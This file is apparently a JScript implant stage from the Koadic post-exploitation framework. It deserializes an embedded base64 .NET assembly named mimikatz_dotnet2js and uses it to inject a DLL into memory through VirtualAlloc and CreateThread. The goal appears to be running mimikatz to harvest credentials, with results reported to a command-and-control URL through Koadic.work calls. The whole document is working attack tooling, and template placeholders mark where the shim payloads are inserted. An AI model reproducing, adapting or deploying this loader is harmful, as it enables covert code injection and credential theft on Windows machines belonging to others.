function setversion() {
var shell = new ActiveXObject('WScript.Shell');
ver = 'v4.0.30319';
try {
shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
} catch(e) {
ver = 'v2.0.50727';
}
shell.Environment('Process')('COMPLUS_Version') = ver;

}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABQAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAUQdxWQAAAAAA"+
"AAAA4AAiIAsBMAAADAAAAAYAAAAAAAAiKgAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA0CkA"+
"AE8AAAAAQAAAyAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAJgoAAAcAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA"+
"AAAALnRleHQAAAAoCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAyAMAAABA"+
"AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA"+
"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAQqAAAAAAAASAAAAAIABQDQIAAAyAcAAAEAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJgIoDgAACgAA"+
"KgAAEzAGAGcAAAABAAARAHIBAABwciUAAHAoDwAACiYDKBAAAAoKfhEAAAoGjmkgABAAAB9AKAMA"+
"AAYLBhYHBo5pKBIAAAoAEgISASgTAAAKBWpYKBQAAAoWDQQoFQAAChMEfhEAAAoWCBEEFhIDKAQA"+
"AAYmKgBCU0pCAQABAAAAAAAMAAAAdjIuMC41MDcyNwAAAAAFAGwAAACUAgAAI34AAAADAABwAwAA"+
"I1N0cmluZ3MAAAAAcAYAADQAAAAjVVMApAYAABAAAAAjR1VJRAAAALQGAAAUAQAAI0Jsb2IAAAAA"+
"AAAAAgAAAUcVAhQJAAAAAPoBMwAWAAABAAAAFAAAAAIAAAAEAAAADQAAABUAAAAOAAAAAQAAAAIA"+
"AAACAAAAAQAAAAIAAAAAAAoCAQAAAAAABgAmAZACBgCTAZACBgBzAF4CDwCwAgAABgCbAC4CBgAJ"+
"AS4CBgDqAC4CBgB6AS4CBgBGAS4CBgBfAS4CBgCyAC4CBgCHAHECBgBlAHECBgDNAC4CBgAtAycC"+
"CgBfA/UCCgBFA/UCBgBSAycCBgBXAicCBgDoAXECAAAAABMAAAAAAAEAAQABABAACgMAAD0AAQAB"+
"AFAgAAAAAIYYUQIGAAEAXCAAAAAAhgAcAFMAAQAAAAAAgACWIC8AWgAEAAAAAACAAJYgRwBiAAgA"+
"AAABAAEAAAACACECAAADAD4DAAABABQDAAACAL0BAAADAFQAAAAEADQDAAABAL8CAAACALEBAAAD"+
"AB4DAAAEAEUCAAAFANICAgAGADwACQBRAgEAEQBRAgYAGQBRAgoAKQBRAhAAMQBRAhAAOQBRAhAA"+
"QQBRAhAASQBRAhAAUQBRAhAAWQBRAhAAYQBRAhUAaQBRAhAAcQBRAhAAeQBRAgYAgQBaAyMAkQDE"+
"ASoAmQBAAjAAoQBqAzMAmQALADwAmQBRAkAAoQDVAUUALgALAG0ALgATAHYALgAbAJUALgAjAJ4A"+
"LgArALYALgAzALYALgA7ALYALgBDAJ4ALgBLALwALgBTALYALgBbALYALgBjANQALgBrAP4AQwBb"+
"AAsBGgD9AfABQAEHAC8AAQBGAQkARwACAASAAAABAAAAAAAAAAAAAAAAAOICAAACAAAAAAAAAAAA"+
"AABKACYAAAAAAAIAAAAAAAAAAAAAAEoA9QIAAAAAAAAAZGxsQmFzZTY0AFRvSW50NjQAPE1vZHVs"+
"ZT4ASW5qZWN0RExMAG1zY29ybGliAFZpcnR1YWxBbGxvYwBscFRocmVhZElkAENyZWF0ZVRocmVh"+
"ZABmbEFsbG9jYXRpb25UeXBlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21W"+
"aXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtB"+
"dHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRp"+
"b25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4"+
"YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdo"+
"dEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlB"+
"dHRyaWJ1dGUAZHdTdGFja1NpemUAZHdTaXplAEZyb21CYXNlNjRTdHJpbmcAU3RyaW5nVG9IR2xv"+
"YmFsVW5pAE1hcnNoYWwAS2VybmVsMzIuZGxsAGtlcm5lbDMyLmRsbABtaW1pa2F0el9kb3RuZXQy"+
"anMuZGxsAHBhcmFtAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBaZXJvAGxwUGFyYW1ldGVyAC5j"+
"dG9yAEludFB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZp"+
"Y2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAbHBUaHJl"+
"YWRBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBtaW1pa2F0el9kb3RuZXQyanMAU3lzdGVtLldp"+
"bmRvd3MuRm9ybXMAVGVzdENsYXNzAGxwQWRkcmVzcwBscFN0YXJ0QWRkcmVzcwBPYmplY3QAZmxQ"+
"cm90ZWN0AG9mZnNldABEaWFsb2dSZXN1bHQAQ29udmVydABTaG93AE1lc3NhZ2VCb3gAQ29weQAA"+
"ACNEAE8AVAAgAE4ARQBUACAARQBYAEUAQwBVAFQASQBPAE4AAA1XAE8ATwBIAE8ATwAAAC1JLUh9"+
"nxtEvgVhBKnNBigABCABAQgDIAABBSABARERBCABAQ4EIAEBAggHBR0FGBgJGAYAAhFFDg4FAAEd"+
"BQ4CBhgIAAQBHQUIGAgDIAAKBCABAQoEAAEYDgi3elxWGTTgiQYgAwEODggHAAQYGAgJCQoABgkY"+
"CRgYCRAJCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAcBAAAAABcB"+
"ABJtaW1pa2F0el9kb3RuZXQyanMAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMTcAACkBACQ5"+
"NzMxMDllNS02YmUwLTRjYzktYjRlNi01MTgwNGE4NjA5OWMAAAwBAAcxLjAuMC4wAAAFAQABAAAA"+
"AAAAAAAAUQdxWQAAAAACAAAAHAEAALQoAAC0CgAAUlNEU/HE1KAtC/9Htgpoj7D3VAABAAAAQzpc"+
"VXNlcnNccjAwdFxEZXNrdG9wXHdvcmtzaG9wXGdvb2Rcd29ya3Nob3BcbWltaWthdHpfZG90bmV0"+
"MmpzXG1pbWlrYXR6X2RvdG5ldDJqc1xvYmpcRGVidWdcbWltaWthdHpfZG90bmV0MmpzLnBkYgAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4KQAAAAAAAAAAAAASKgAAACAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAABCoAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUA"+
"IAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA"+
"AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAABsAwAAAAAAAAAAAABsAzQAAABW"+
"AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAA"+
"PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA"+
"AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEzAIAAAEAUwB0AHIAaQBuAGcA"+
"RgBpAGwAZQBJAG4AZgBvAAAAqAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBl"+
"AG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAAE4AEwABAEYA"+
"aQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABtAGkAbQBpAGsAYQB0AHoAXwBkAG8AdABu"+
"AGUAdAAyAGoAcwAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAA"+
"LgAwAAAATgAXAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABtAGkAbQBpAGsAYQB0AHoAXwBk"+
"AG8AdABuAGUAdAAyAGoAcwAuAGQAbABsAAAAAABIABIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkA"+
"ZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAxADcAAAAqAAEAAQBMAGUAZwBh"+
"AGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAFYAFwABAE8AcgBpAGcAaQBuAGEAbABGAGkA"+
"bABlAG4AYQBtAGUAAABtAGkAbQBpAGsAYQB0AHoAXwBkAG8AdABuAGUAdAAyAGoAcwAuAGQAbABs"+
"AAAAAABGABMAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAG0AaQBtAGkAawBhAHQAegBfAGQA"+
"bwB0AG4AZQB0ADIAagBzAAAAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAx"+
"AC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEA"+
"LgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAACQ6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs"+
"ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var n = fmt.SurrogateSelector;
	var d = fmt.Deserialize_2(stm);
	al.Add(n);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);

  var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();

  var base64DLL = "~SHIMX86B64~";

	o.InjectDLL(base64DLL, shim_lpParam, ~SHIMX86OFFSET~);

  Koadic.work.report("Done");
} catch (e) {
  Koadic.work.error(e);
}
